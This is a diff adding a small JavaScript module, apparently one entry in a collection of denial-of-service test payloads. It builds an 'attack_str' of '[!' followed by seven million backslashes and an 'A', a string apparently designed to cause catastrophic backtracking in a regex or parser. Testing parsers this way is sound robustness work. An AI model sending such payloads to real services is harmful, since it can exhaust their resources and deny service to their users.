@@ -1,0 +1,9 @@
+function getPayload() {
+    const genstr = require("../utils").genstr;
+
+    let attack_str = "[!" + genstr(7000000, "\\") + "A";
+
+    return { attack_str };
+}
+
+module.exports = { getPayload };
